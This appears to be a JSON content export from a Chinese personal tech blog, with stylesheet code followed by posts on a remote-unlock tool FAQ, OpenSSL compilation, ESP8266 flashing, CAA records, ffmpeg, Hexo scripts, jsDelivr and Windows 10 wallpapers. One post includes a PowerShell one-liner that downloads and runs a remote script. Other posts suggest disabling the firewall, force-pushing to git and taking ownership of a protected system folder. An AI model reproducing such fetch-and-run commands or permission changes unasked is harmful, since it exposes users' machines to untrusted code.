note:before{content:\"\\f249\"}.fa-sticky-note-o:before{content:\"\\f24a\"}.fa-cc-jcb:before{content:\"\\f24b\"}.fa-cc-diners-club:before{content:\"\\f24c\"}.fa-clone:before{content:\"\\f24d\"}.fa-balance-scale:before{content:\"\\f24e\"}.fa-hourglass-o:before{content:\"\\f250\"}.fa-hourglass-1:before,.fa-hourglass-start:before{content:\"\\f251\"}.fa-hourglass-2:before,.fa-hourglass-half:before{content:\"\\f252\"}.fa-hourglass-3:before,.fa-hourglass-end:before{content:\"\\f253\"}.fa-hourglass:before{content:\"\\f254\"}.fa-hand-grab-o:before,.fa-hand-rock-o:before{content:\"\\f255\"}.fa-hand-paper-o:before,.fa-hand-stop-o:before{content:\"\\f256\"}.fa-hand-scissors-o:before{content:\"\\f257\"}.fa-hand-lizard-o:before{content:\"\\f258\"}.fa-hand-spock-o:before{content:\"\\f259\"}.fa-hand-pointer-o:before{content:\"\\f25a\"}.fa-hand-peace-o:before{content:\"\\f25b\"}.fa-trademark:before{content:\"\\f25c\"}.fa-registered:before{content:\"\\f25d\"}.fa-creative-commons:before{content:\"\\f25e\"}.fa-gg:before{content:\"\\f260\"}.fa-gg-circle:before{content:\"\\f261\"}.fa-tripadvisor:before{content:\"\\f262\"}.fa-odnoklassniki:before{content:\"\\f263\"}.fa-odnoklassniki-square:before{content:\"\\f264\"}.fa-get-pocket:before{content:\"\\f265\"}.fa-wikipedia-w:before{content:\"\\f266\"}.fa-safari:before{content:\"\\f267\"}.fa-chrome:before{content:\"\\f268\"}.fa-firefox:before{content:\"\\f269\"}.fa-opera:before{content:\"\\f26a\"}.fa-internet-explorer:before{content:\"\\f26b\"}.fa-television:before,.fa-tv:before{content:\"\\f26c\"}.fa-contao:before{content:\"\\f26d\"}.fa-500px:before{content:\"\\f26e\"}.fa-amazon:before{content:\"\\f270\"}.fa-calendar-plus-o:before{content:\"\\f271\"}.fa-calendar-minus-o:before{content:\"\\f272\"}.fa-calendar-times-o:before{content:\"\\f273\"}.fa-calendar-check-o:before{content:\"\\f274\"}.fa-industry:before{content:\"\\f275\"}.fa-map-pin:before{content:\"\\f276\"}.fa-map-signs:before{content:\"\\f277\"}.fa-map-o:before{content:\"\\f278\"}.fa-map:before{content:\"\\f279\"}.fa-commenting:before{content:\"\\f27a\"}.fa-commenting-o:before{content:\"\\f27b\"}.fa-houzz:before{content:\"\\f27c\"}.fa-vimeo:before{content:\"\\f27d\"}.fa-black-tie:before{content:\"\\f27e\"}.fa-fonticons:before{content:\"\\f280\"}.fa-reddit-alien:before{content:\"\\f281\"}.fa-edge:before{content:\"\\f282\"}.fa-credit-card-alt:before{content:\"\\f283\"}.fa-codiepie:before{content:\"\\f284\"}.fa-modx:before{content:\"\\f285\"}.fa-fort-awesome:before{content:\"\\f286\"}.fa-usb:before{content:\"\\f287\"}.fa-product-hunt:before{content:\"\\f288\"}.fa-mixcloud:before{content:\"\\f289\"}.fa-scribd:before{content:\"\\f28a\"}.fa-pause-circle:before{content:\"\\f28b\"}.fa-pause-circle-o:before{content:\"\\f28c\"}.fa-stop-circle:before{content:\"\\f28d\"}.fa-stop-circle-o:before{content:\"\\f28e\"}.fa-shopping-bag:before{content:\"\\f290\"}.fa-shopping-basket:before{content:\"\\f291\"}.fa-hashtag:before{content:\"\\f292\"}.fa-bluetooth:before{content:\"\\f293\"}.fa-bluetooth-b:before{content:\"\\f294\"}.fa-percent:before{content:\"\\f295\"}.fa-gitlab:before{content:\"\\f296\"}.fa-wpbeginner:before{content:\"\\f297\"}.fa-wpforms:before{content:\"\\f298\"}.fa-envira:before{content:\"\\f299\"}.fa-universal-access:before{content:\"\\f29a\"}.fa-wheelchair-alt:before{content:\"\\f29b\"}.fa-question-circle-o:before{content:\"\\f29c\"}.fa-blind:before{content:\"\\f29d\"}.fa-audio-description:before{content:\"\\f29e\"}.fa-volume-control-phone:before{content:\"\\f2a0\"}.fa-braille:before{content:\"\\f2a1\"}.fa-assistive-listening-systems:before{content:\"\\f2a2\"}.fa-american-sign-language-interpreting:before,.fa-asl-interpreting:before{content:\"\\f2a3\"}.fa-deaf:before,.fa-deafness:before,.fa-hard-of-hearing:before{content:\"\\f2a4\"}.fa-glide:before{content:\"\\f2a5\"}.fa-glide-g:before{content:\"\\f2a6\"}.fa-sign-language:before,.fa-signing:before{content:\"\\f2a7\"}.fa-low-vision:before{content:\"\\f2a8\"}.fa-viadeo:before{content:\"\\f2a9\"}.fa-viadeo-square:before{content:\"\\f2aa\"}.fa-snapchat:before{content:\"\\f2ab\"}.fa-snapchat-ghost:before{content:\"\\f2ac\"}.fa-snapchat-square:before{content:\"\\f2ad\"}.fa-pied-piper:before{content:\"\\f2ae\"}.fa-first-order:before{content:\"\\f2b0\"}.fa-yoast:before{content:\"\\f2b1\"}.fa-themeisle:before{content:\"\\f2b2\"}.fa-google-plus-circle:before,.fa-google-plus-official:before{content:\"\\f2b3\"}.fa-fa:before,.fa-font-awesome:before{content:\"\\f2b4\"}.fa-handshake-o:before{content:\"\\f2b5\"}.fa-envelope-open:before{content:\"\\f2b6\"}.fa-envelope-open-o:before{content:\"\\f2b7\"}.fa-linode:before{content:\"\\f2b8\"}.fa-address-book:before{content:\"\\f2b9\"}.fa-address-book-o:before{content:\"\\f2ba\"}.fa-address-card:before,.fa-vcard:before{content:\"\\f2bb\"}.fa-address-card-o:before,.fa-vcard-o:before{content:\"\\f2bc\"}.fa-user-circle:before{content:\"\\f2bd\"}.fa-user-circle-o:before{content:\"\\f2be\"}.fa-user-o:before{content:\"\\f2c0\"}.fa-id-badge:before{content:\"\\f2c1\"}.fa-drivers-license:before,.fa-id-card:before{content:\"\\f2c2\"}.fa-drivers-license-o:before,.fa-id-card-o:before{content:\"\\f2c3\"}.fa-quora:before{content:\"\\f2c4\"}.fa-free-code-camp:before{content:\"\\f2c5\"}.fa-telegram:before{content:\"\\f2c6\"}.fa-thermometer-4:before,.fa-thermometer-full:before,.fa-thermometer:before{content:\"\\f2c7\"}.fa-thermometer-3:before,.fa-thermometer-three-quarters:before{content:\"\\f2c8\"}.fa-thermometer-2:before,.fa-thermometer-half:before{content:\"\\f2c9\"}.fa-thermometer-1:before,.fa-thermometer-quarter:before{content:\"\\f2ca\"}.fa-thermometer-0:before,.fa-thermometer-empty:before{content:\"\\f2cb\"}.fa-shower:before{content:\"\\f2cc\"}.fa-bath:before,.fa-bathtub:before,.fa-s15:before{content:\"\\f2cd\"}.fa-podcast:before{content:\"\\f2ce\"}.fa-window-maximize:before{content:\"\\f2d0\"}.fa-window-minimize:before{content:\"\\f2d1\"}.fa-window-restore:before{content:\"\\f2d2\"}.fa-times-rectangle:before,.fa-window-close:before{content:\"\\f2d3\"}.fa-times-rectangle-o:before,.fa-window-close-o:before{content:\"\\f2d4\"}.fa-bandcamp:before{content:\"\\f2d5\"}.fa-grav:before{content:\"\\f2d6\"}.fa-etsy:before{content:\"\\f2d7\"}.fa-imdb:before{content:\"\\f2d8\"}.fa-ravelry:before{content:\"\\f2d9\"}.fa-eercast:before{content:\"\\f2da\"}.fa-microchip:before{content:\"\\f2db\"}.fa-snowflake-o:before{content:\"\\f2dc\"}.fa-superpowers:before{content:\"\\f2dd\"}.fa-wpexplorer:before{content:\"\\f2de\"}.fa-meetup:before{content:\"\\f2e0\"}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto} /* rebuild by neat */"},{"title":"","date":"2025-08-07T14:24:42.229Z","updated":"2025-08-07T14:24:42.229Z","comments":true,"path":"404/css/style.css","permalink":"https://czqu.net/404/css/style.css","excerpt":"","text":"/* build time:Thu Aug 07 2025 14:25:36 GMT+0000 (Coordinated Universal Time)*/ html{scroll-behavior:smooth}body,html{margin:0;padding:0;color:#585858}*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif}.wrapper-full{width:100%;padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}.wrapper{width:100%;padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}@media (min-width:576px){.wrapper{max-width:540px}}@media (min-width:768px){.wrapper{max-width:720px}}@media (min-width:992px){.wrapper{max-width:960px}}@media (min-width:1200px){.wrapper{max-width:1140px}}.img-responsive{max-width:100%;display:block}.img-fluid{width:100%}.d-grid{display:grid}.d-flex{display:flex;display:-webkit-flex;flex-wrap:wrap}.text-center{text-align:center}.text-left{text-align:left}.text-right{text-align:right}button,input,select{-webkit-appearance:none;outline:0}.btn,button,select{cursor:pointer}a{text-decoration:none}iframe{border:none}h1,h2,h3,h4,h5,h6,ol,p,ul{margin:0;padding:0}.p-relative{position:relative}.p-absolute{position:absolute}.p-fixed{position:fixed}.p-sticky{position:-webkit-sticky;position:sticky}body a:hover,body button:hover{opacity:.8}a,h1,h2,h3,h4,h5,h6{color:#050404}p{color:#585858}.error-page .covers-main{background:url(../images/error.jpg) no-repeat center;background-size:cover;-webkit-background-size:cover;-moz-background-size:cover;-o-background-size:cover;-ms-background-size:cover;position:relative;z-index:0;min-height:100vh;align-items:center;display:grid;max-width:100%}.error-page .covers-main:before{content:\"\";background:rgba(16,16,16,.4);position:absolute;top:0;min-height:100%;left:0;right:0;z-index:-1}.error-page .main-cover{max-width:510px;margin:0 auto}.error-page a.logo{color:#fff;font-size:32px;font-weight:100;margin-bottom:1rem;display:inline-block;line-height:44px}.error-page .cover-para{color:#fff;line-height:120px;font-size:180px;margin-bottom:50px;font-weight:600}.error-page h4.cover-para span{font-size:150px}.error-page p.form-text{font-size:17px;line-height:25px;color:#eee}.error-page h5.form-title{color:#eee}.error-page a.back-button{border:none;font-weight:600;display:inline-block;font-size:16px;color:#fff;background:rgba(255,255,255,.16);text-align:center;padding:12px 18px;margin-top:4em;box-shadow:0 3px 4px 2px rgba(14,14,14,.04)}.copyright p{font-size:15px;color:#ccc;line-height:20px;margin-top:4rem}.copyright p a{color:#fff}@media screen and (max-width:568px){.error-page a.logo{font-size:35px}.error-page p.page-detail{font-size:18px}.error-page a.back-button{margin-top:3em}.error-page .cover-para{font-size:130px;margin-bottom:20px}.error-page .cover-para{font-size:160px}.error-page h4.cover-para span{font-size:130px}}@media screen and (max-width:384px){.error-page p.form-text{font-size:16px}.error-page .cover-para{font-size:130px}.error-page h4.cover-para span{font-size:110px}} /* rebuild by neat */"}],"posts":[{"title":"远程解锁常见问题","slug":"release/rfu/FAQ","date":"2024-05-22T16:00:00.000Z","updated":"2024-05-22T16:00:00.000Z","comments":true,"path":"posts/31496/","permalink":"https://czqu.net/posts/31496/","excerpt":"","text":"联系我们：QQ群：1053768454(推荐) 或者在文末评论区留下你的意见和建议。 常见问题：1.锁屏界面无反应？无法连接？新版不在锁屏界面展示解锁结果，而是通过接口返回，调用接口的时候可以看到。接口文档可以到官网查阅。 无法连接可能是防火墙问题，可以试试先关闭防火墙排查，此问题的出现可能是安装的时候阻止了创建防火墙规则请手动给LogonUI.exe添加规则。 还有一种可能就是启动了开始配对。请看第三条。 目前的网络插件只有局域网版，监听了所有IP，支持IPV6，但是不建议直接开放到公网。 2.锁屏界面提示用户名密码错误~~1.请检查你输入的是密码而不是pin。 2.如果有更改过微软账户密码，可能是本地密码和在线密码不同步导致的 建议您参考以下步骤： 方案一：直接重新绑定微软账户和本地账户 方案二： 1.按Windows徽标 + R组合键调出运行窗口，在其中输入“control userpasswords2 ”或“netplwiz”，打开“用户帐户”窗口， 2.选中需要操作的帐户，重新勾选“要使用本计算机，用户必须输入用户名和密码”，然后“应用”；然后再取消勾选“要使用本计算机，用户必须输入用户名和密码”，再点击“应用”，就会弹出自动登录设置窗口了。在其中输入微软帐户的新密码，然后点击“确定”关闭“自动登录”设置窗口，最后点击“用户帐户”窗口的“确定”按钮。 https://answers.microsoft.com/zh-hans/windows/forum/all/microsoft%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95/092f9d9c-909e-4f7f-8fab-5e4169480960 3.二维码怎么不见了?（鸿蒙用户请绕过此此条，鸿蒙版支持自动配对无需扫码。二维码被移到控制面板了,请通过下拉框选择合适的网卡，不然无法解锁。开机功能一般需要有线网卡的支持请选择有线网卡。 如果配对的时候想进行测试，可以在这点开始配对。此操作会打开和锁屏界面一样的服务，支持蓝牙发送，或者http api的测试。使用后请关闭。不然锁屏界面可能会无法连接。 1.连接不上/fail to connect xxxx/一直显示查找ip的解决办法1.可能是防火墙问题导致的： 解决方案Windows防火墙 –&gt; 高级设置 –&gt; 入站规则 –&gt; 在列表里找到“文件和打印机共享(回显请求 - ICMPv4-In)” –&gt; 右击选择启用规则，并在其属性里设置为‘允许连接’–&gt; 确定 –&gt; 大功告成。要禁止ping,去掉勾选即可. 2.由于ip设置错误导致的(下一版本修复) 解决方案： 手动搜索添加即可，不要用二维码添加 1.检查电脑和手机是否在同一局域网 2.检查App中使用的ip与电脑当前ip是否一致 检查方法如下： App点击管理-》选择设备-》查看更多-》ip: win10直接打开网络和Internet设置查看: 2.锁屏界面无任何变化，没有出现远程解锁的图标手动添加注册表信息，双击Register.reg一直点是就行了。如果仍然没有显示在登录界面，请检查是否安装VC Redistributable for 2017。安装2.0版本前请先卸载2.0以下的版本。 3.Windows 7 安装了Windows10 版本导致锁屏界面一直闪烁遇到这种情况，进入修复环境，打开命令行选项用del命令删除安装目录下RemoteFingerUnlockModule.dll文件即可。 4.锁屏界面提示用户名密码错误1.请检查你输入的是密码而不是pin。 2.如果有更改过微软账户密码，可能是本地密码和在线密码不同步导致的 建议您参考以下步骤： 方案一：直接重新绑定微软账户和本地账户 方案二： 1.按Windows徽标 + R组合键调出运行窗口，在其中输入“control userpasswords2 ”或“netplwiz”，打开“用户帐户”窗口， 2.选中需要操作的帐户，重新勾选“要使用本计算机，用户必须输入用户名和密码”，然后“应用”；然后再取消勾选“要使用本计算机，用户必须输入用户名和密码”，再点击“应用”，就会弹出自动登录设置窗口了。在其中输入微软帐户的新密码，然后点击“确定”关闭“自动登录”设置窗口，最后点击“用户帐户”窗口的“确定”按钮。 https://answers.microsoft.com/zh-hans/windows/forum/all/microsoft%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95/092f9d9c-909e-4f7f-8fab-5e4169480960","categories":[{"name":"远程解锁","slug":"远程解锁","permalink":"https://czqu.net/categories/%E8%BF%9C%E7%A8%8B%E8%A7%A3%E9%94%81/"}],"tags":[{"name":"远程解锁","slug":"远程解锁","permalink":"https://czqu.net/tags/%E8%BF%9C%E7%A8%8B%E8%A7%A3%E9%94%81/"}]},{"title":"docker in Mac在IDEA上无法连接","slug":"draft/docker-in-mac","date":"2022-03-14T16:27:14.000Z","updated":"2022-03-14T16:27:14.000Z","comments":true,"path":"posts/1231995594/","permalink":"https://czqu.net/posts/1231995594/","excerpt":"","text":"错误信息：Connot connect: java.io.IOException: unexpected end of stream on http://docker.socket/… 在某代理软件里确实显示这个链接通过了代理 加上例外后轻松解决：","categories":[],"tags":[{"name":"mac","slug":"mac","permalink":"https://czqu.net/tags/mac/"},{"name":"docker","slug":"docker","permalink":"https://czqu.net/tags/docker/"}]},{"title":"OpenSSL在Windows和Linux下的编译","slug":"draft/Compilation-of-OpenSSL-under-Windows-and-Linux","date":"2021-11-13T05:10:11.000Z","updated":"2021-11-13T05:10:11.000Z","comments":true,"path":"posts/33090/","permalink":"https://czqu.net/posts/33090/","excerpt":"","text":"具体参见https://wiki.openssl.org/index.php/Compilation_and_Installation Windows下的编译第一步：下载ActivePerl （https://www.activestate.com/products/perl/） ，安装ActivePerl，默认安装路径在C:\\Perl64。打开命令提示符，定位到 C:\\Perl64\\eg 目录，执行 perl example.pl，若提示 Hello from ActivePerl! 则说明 Perl 安装成功。（注意： 这里只能下载64位系统安装的版本） 注：可能报错“Can’t locate Win32/Console.pm”这里可以下载我编译好的版本https://platform.activestate.com/DonaldXY/ActivePerl-5.26/distributions 或者直接在cmd执行以下代码 12powershell -Command \"&amp; $([scriptblock]::Create((New-Object Net.WebClient).DownloadString('https://platform.activestate.com/dl/cli/_pdli01/install-latest.ps1'))) -c'state activate --default DonaldXY/ActivePerl-5.26'\" 第二步：下载并安装 nasm汇编器（http://www.nasm.us/， ），默认安装在C:\\Users\\lenovo\\AppData\\Local\\bin\\NASM，将此路径加入Path环境变量，这个可以下载32位或者64位都没所谓 第三步 执行perl Configure VC-WIN32 –prefix=c:\\openssl\\win32，prefix参数指的是后面执行nmake install命令把OpenSSL安装到哪个目录。 64位 编译 就改成VC-WIN64A 静态编译加no-shared 如:perl Configure no-shared VC-WIN64A –prefix=c:\\openssl\\win32 第四步：编译 (使用VS2019 的命令行，64位要使用64位的) nmake nmake test nmake install 重新编译需要执行清理 nmake clean 很多博客编译OPENSSL 的方法在1.1.0以后的版本都不行，具体出现的问题是 It looks like you don’t have either nmake.exe or dmake.exe on your PATH, so you will not be able to execute the commands from a Makefile. You can install dmake.exe with the Perl Package Manager by running: ppm install dmake 下面才是老版本和新版本不同的编译办法 都是打开VS自己的命令行，不要打开WINDOWS的命令行 老版本（1.1.0以前的版本是）是 执行ms\\do_nasm 执行nmake -f ms\\ntdll.mak，此处大约需要几分钟，如果一切正常，会在out32dll目录下生成很多dll和exe文件。 执行nmake -f ms\\ntdll.mak test，如果全部显示OK，说明编译正确。 执行nmake -f ms\\ntdll.mak install，所有头文件和lib文件就都被拷贝到前面prefix指定的目录了。 新版本（1.1.0以后的版本是） nmake nmake test nmake install Linux下的编译去官网下载源码，具体命令以1.1.1g为例 1234567wget https://www.openssl.org/source/openssl-1.1.1g.tartar -xzf openssl-1.1.1g.tar.gzcd openssl-1.1.1g./config --prefix=/usr/local/openssl./config -tmakemake install","categories":[],"tags":[{"name":"运维","slug":"运维","permalink":"https://czqu.net/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"esp8266固件的安装","slug":"release/烧录esp8266","date":"2021-10-05T01:25:00.000Z","updated":"2021-10-05T01:25:00.000Z","comments":true,"path":"posts/3450539282/","permalink":"https://czqu.net/posts/3450539282/","excerpt":"","text":"安装驱动首先需要安装驱动，你需要问问卖给你这个设备的卖家。 安装固件 可以直接使用写好的脚本傻瓜式刷入 链接：https://pan.baidu.com/s/1ukUvB0x7mUhHkJWuoQy2fQ提取码：b0hy 想自己安装的可以继续往下看 首先你需要安装依赖 12pip install esptoolpip install pyserial 接着就可以进行刷写固件了 1python ./esptool.py --port COM13 write_flash 0x0000 ./firmware.bin 这里的COM13可以使用设备管理器查看： 擦除擦除后所有数据都会消失，需要重新刷写固件 擦除所有数据 (所有数据会变成 0xFF ): 1esptool.py erase_flash 擦除指定区域的数据, 例如 从0x20000 到 0x4000 (共16KB): 1esptool.py erase_region 0x20000 0x4000 地址和长度都必须是SPI flash erase扇区大小的倍数。也就是0x1000(4096)字节。 详情参见 espressif/esptool: Espressif SoC serial bootloader utility (github.com)","categories":[{"name":"远程解锁","slug":"远程解锁","permalink":"https://czqu.net/categories/%E8%BF%9C%E7%A8%8B%E8%A7%A3%E9%94%81/"}],"tags":[{"name":"esp8266","slug":"esp8266","permalink":"https://czqu.net/tags/esp8266/"}]},{"title":"CNAME记录指向vercel影响了CAA记录导致的SSL证书无法签发的问题","slug":"release/vercel导致的SSL证书无法签发的问题","date":"2021-09-30T15:16:00.000Z","updated":"2023-03-04T23:36:00.000Z","comments":true,"path":"posts/3655275721/","permalink":"https://czqu.net/posts/3655275721/","excerpt":"","text":"直接看解决方案最狠的：直接把dns中有关vercel全暂停了或者：先暂停二级域名对vecel的解析，即暂停example.com-&gt;vecel然后再暂停受影响的子域的vecel 即暂停 a.example.com-&gt;vecel 问题今天阿里云告知我有一个域名的SSL证书快过期了，已经是老手的我熟练地打开阿里云控制台申请证书。 但是发生了一件怪事，以往证书都能在一分钟下发，而这一次等了好久都不行。我决定先睡一觉起来再看看。 睡醒以后，打开阿里云控制台，发现还是不成功，此时我仍然怀疑是阿里云的锅。于是我用freessl再申请了一次，等到下午还是没成功。用myssl.com/检测的结果如下： 地区 是否匹配 中国 不匹配 (验证失败，您的CAA配置不允许当前CA为您签发证书，请修改为：symantec.com或digicert.com) 香港 不匹配 (验证失败，您的CAA配置不允许当前CA为您签发证书，请修改为：symantec.com或digicert.com) 美国 不匹配 (验证失败，您的CAA配置不允许当前CA为您签发证书，请修改为：symantec.com或digicert.com) 我没设置过CAA记录啊！ 我心想应该不是DNS缓存的问题吧？不可能啊！ 但是我还是到阿里云控制台把所有的DNS记录都暂停解析。 结果，居然成功了！成功了！ 后经过排查发现是解析到vercel上的cname记录导致的问题发生，这是为啥呢？vercel还有权限帮我设置CAA记录！？ 原因后经一番搜索终于知道了原因，就是因为CAA记录惹的祸 CAA(Certificate Authority Authorization)，即证书颁发机构授权。是一项新的可以添加到DNS记录中的额外字段,通过DNS机制创建CAA资源记录，可以限定域名颁发的证书和CA（证书颁发机构）之间的联系。未经授权的第三方尝试通过其他CA注册获取用于该域名的SSL/TLS证书将被拒绝。 域名设置 CAA 记录，使网站所有者，可授权指定CA机构为自己的域名颁发证书，以防止HTTPS证书错误签发，从而提高网站安全性。 补充一个知识点，CNAME记录会影响CAA记录： CAA 记录检查继续对指向不同域的 CNAME 记录进行。在此例中，www.example.com 指向 www.example.net ，后者也有 CAA 记录： 123456(Example 7 / www.example.com)Domain Record type Flags Tag Value www.example.com. CNAME www.example.netwww.example.net. CAA 0 issue \";\"(Result: CAA failed) 第一个记录将 CAA 检查转向 www.example.net。此 CAA 记录可阻止任何 CA 颁发证书，证书办法机构无法为 www.example.com 颁发证书。 如果所指向的域 (www.example.net) 没有 CAA 记录，则 CAA 记录检查将上攀到基本域 (example.com)。 123456(Example 8 / www.example.com)Domain Record type Flags Tag Value www.example.com. CNAME www.example.netexample.com. CAA 0 issue \"amazon.com\"(Result: CAA passed) 用白话说就是因为设置了cname指向vercel，而vercel设置了CAA记录，从而影响了我们的域名的CAA记录，用工具查询后发现确实如此： 123456789101112131415161718192021222324252627282930{ \"canIssue\": false, \"status\": \"IssueMismatch\", \"domain\": \"czqu.net\", \"queryAt\": \"Sep 30, 2021 11:21:55 AM\", \"elapsed\": 1, \"caaRecordSet\": [ { \"domain\": \"czqu.net\", \"caaRecords\": [ { \"issuerCritical\": 0, \"tag\": \"issue\", \"value\": \"letsencrypt.org\", \"type\": 257, \"dclass\": 1, \"ttl\": 60 }, { \"issuerCritical\": 0, \"tag\": \"issue\", \"value\": \"globalsign.com\", \"type\": 257, \"dclass\": 1, \"ttl\": 60 } ] } ]} 因此阿里云使用的免费DigiCert 证书颁发机构无法给我的域名颁发证书。","categories":[],"tags":[{"name":"后端","slug":"后端","permalink":"https://czqu.net/tags/%E5%90%8E%E7%AB%AF/"},{"name":"踩坑","slug":"踩坑","permalink":"https://czqu.net/tags/%E8%B8%A9%E5%9D%91/"}]},{"title":"利用ffmpeg将MP4转换成m3u8格式的视频切片","slug":"draft/MP4转换成m3u8","date":"2021-09-30T01:25:00.000Z","updated":"2021-09-30T01:25:00.000Z","comments":true,"path":"posts/823464988/","permalink":"https://czqu.net/posts/823464988/","excerpt":"","text":"1.获取ffmpeg打开这里下载 2.视频切片第一步：mp4转成ts格式，一对一转换，转换后大小没什么变化。 1ffmpeg -y -i 迪迦奥特曼.mp4 -vcodec copy -acodec copy -vbsf h264_mp4toannexb 迪迦奥特曼.ts 第二步，按间隔分片，1对N，下面的5即“每个分片5秒”，可以自己切换。 1ffmpeg -i 迪迦奥特曼.ts -c copy -map 0 -f segment -segment_list playlist.m3u8 -segment_time 5 迪迦奥特曼%03d.ts 关于MP4的参数，务必满足视频编码为H264，音视频编码为AAC（YouTube下载的视频默认即此格式），如果不是请用格式工厂进行转换 3.完成把中间生成的ts文件清理 推荐使用DPlayer进行视频播放","categories":[],"tags":[{"name":"ffmpeg","slug":"ffmpeg","permalink":"https://czqu.net/tags/ffmpeg/"}]},{"title":"hexo便捷使用方案","slug":"draft/git快速提交并同步到github","date":"2021-09-30T01:15:00.000Z","updated":"2021-09-30T01:15:00.000Z","comments":true,"path":"posts/1115750794/","permalink":"https://czqu.net/posts/1115750794/","excerpt":"","text":"1.快速提交将以下内容保存为bat，然后放置在博客目录下 1234git add -A git commit -m\"%date:~0,4%%date:~5,2%%date:~8,2%%time:~0,2%%time:~3,2%%time:~6,2%\" git push -u origin master -fpause 2.快速预览将以下内容保存为bat，然后放置在博客目录下 1hexo s 喜欢使用Windows Terminal的: 1wt -p \"Windows Powershell\" -d . powershell -noExit \"hexo s\" 在当前选项卡而不是新窗口打开: 1wt --window 0 -p \"Windows Powershell\" -d . powershell -noExit \"hexo s\"","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://czqu.net/tags/git/"},{"name":"hexo","slug":"hexo","permalink":"https://czqu.net/tags/hexo/"}]},{"title":"jsDelivr+Github构建自己的免费CDN","slug":"draft/免费CDN-jsDelivr-Github-使用方法","date":"2021-09-28T14:23:05.000Z","updated":"2021-09-28T14:23:05.000Z","comments":true,"path":"posts/2220992601/","permalink":"https://czqu.net/posts/2220992601/","excerpt":"","text":"CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科 放在Github的资源在国内加载速度比较慢，因此需要使用CDN加速来优化网站打开速度，jsDelivr + Github便是免费且好用的CDN，非常适合博客网站使用。 1、新建Github仓库 2、克隆Github仓库到本地点击 Clone or download，一键复制仓库地址 在本地目录右键 Git Bash Here，执行以下命令： 1git git clone 一键复制的仓库地址 3、上传资源复制需要上传的资源到本地git仓库（注：jsDelivr不支持加载超过20M的资源），在本地git仓库目录下右键 Git Bash Here，执行以下命令： 1234git status //查看状态git add . //添加所有文件到暂存区git commit -m '第一次提交' //把文件提交到仓库git push //推送至远程仓库 4、发布仓库点击release发布 自定义发布版本号 5、通过jsDelivr引用资源使用方法：https://cdn.jsdelivr.net/gh/你的用户名/你的仓库名@发布的版本号/文件路径 例如： 123https://cdn.jsdelivr.net/gh/czqu/cdn@1.0/images/trhx.pnghttps://cdn.jsdelivr.net/gh/czqu/cdn@2.0.1/css/style.css https://cdn.jsdelivr.net/gh/czqu/cdn@3.1.3/test.mp4 注意：版本号不是必需的，是为了区分新旧资源，如果不使用版本号，将会直接引用最新资源，除此之外还可以使用某个范围内的版本，查看所有资源等，具体使用方法如下： 1234567891011121314151617// 加载任何Github发布、提交或分支https://cdn.jsdelivr.net/gh/user/repo@version/file// 加载 jQuery v3.2.1https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js// 使用版本范围而不是特定版本https://cdn.jsdelivr.net/gh/jquery/jquery@3.2/dist/jquery.min.js https://cdn.jsdelivr.net/gh/jquery/jquery@3/dist/jquery.min.js // 完全省略该版本以获取最新版本https://cdn.jsdelivr.net/gh/jquery/jquery/dist/jquery.min.js // 将“.min”添加到任何JS/CSS文件中以获取缩小版本，如果不存在，将为会自动生成https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/src/core.min.js // 在末尾添加 / 以获取资源目录列表https://cdn.jsdelivr.net/gh/jquery/jquery/","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://czqu.net/tags/hexo/"}]},{"title":"保存Win10锁屏上的壁纸","slug":"release/保存Win10锁屏壁纸","date":"2021-09-28T11:32:11.000Z","updated":"2021-09-28T11:32:11.000Z","comments":true,"path":"posts/1037488110/","permalink":"https://czqu.net/posts/1037488110/","excerpt":"","text":"前言：一些用win10的同学可能都有这种感觉，win10的锁屏界面图片特别漂亮，但可惜的是不知道怎么将它保存下来，错过的可能再也找不回来了，因此本文将给大家介绍两种方法保存win10锁屏界面的图片。 一、保存近期的锁屏壁纸：1.打开资源管理器，在地址栏输入如下文字后回车1%localappdata%\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Assets 2.这时可以看到有很多未知文件，这些就是锁屏界面缓存的图片啦 3.然后我们把它复制到另一个文件夹，这里我复制到E盘的新建文件夹里 4.这时候按一下WIN+R键，在运行框输入cmd回车，然后在命令行里用命令定位到你刚才复制的文件夹，如下图 win键大概长下图这样 ： win键 如果文件夹不在系统盘要注意红框这里，需要先切换到文件夹所在磁盘： 5.在命令行里输入下面的命令后回车,这是一个批量重命名的命令，不懂可以不用深究，其实这里正确的格式应该是jfif,不过用jpg也没关系。1ren *.* *.jpg 6.大功告成，在文件夹内右键刷新一下，应该就能正常显示了（打码是为了避免图片侵权），如下图 二、保存当前的锁屏壁纸1.获取用户SID当前锁屏壁纸保存位置和你的用户SID有关系，一般锁屏图片存在如下位置： 1C:\\ProgramData\\Microsoft\\Windows\\SystemData\\&lt;Your-SID&gt;\\ReadOnly\\LockScreen_A 需要用命令行获取，有关命令行的使用方法上文已经有提到过 1wmic useraccount where name='%username%' get sid 2.设置安全属性打开此文件夹由于此文件夹不能直接访问，我们需要首先设置安全属性，于是我们需要首先打开 1C:\\ProgramData\\Microsoft\\Windows 然后打开 SystemData 文件夹的高级安全属性设置，如下图： 先点更改然后点高级： 点击立即查找，找到和你账户相同名字的用户就双击确认: 那么现在文件夹的所有者应该已经变成了你，然后我们给替换字容器和对象的所有者打上勾，然后确定： 3.获取我们需要的图片这时候我们应该可以打开 SystemData 文件夹了，这里面会有多个子文件夹，和上文获取到的&lt;Your-SID&gt;是对应的 